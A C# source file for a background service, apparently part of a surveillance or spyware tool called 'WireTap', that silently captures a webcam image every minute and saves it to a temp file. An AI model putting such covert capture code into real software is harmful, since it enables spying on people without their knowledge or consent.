﻿namespace WireTap.HostedService
{
    using Microsoft.Extensions.Hosting;
    using System;
    using System.Threading;
    using System.Threading.Tasks;

    internal class WebcamService : ServiceBase, IHostedService
    {
        protected override async Task InternalExecuteAsync(CancellationToken cancellationToken)
        {
            Console.WriteLine("WebcamService : StartWebCameraServiceAsync");

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    Console.WriteLine("WebcamService : Inside captureWebCam");
                    var filename = Helpers.CreateTempFileName(".jpeg", "webcam-", "webcam");
                    WebCam.CaptureImage(filename);
                    Console.WriteLine("WebcamService : [+] Webcam captured at: {0}", filename);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(string.Concat("WebcamService : ", ex.Message, '\n' + ex.StackTrace));
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            }
        }
    }
}
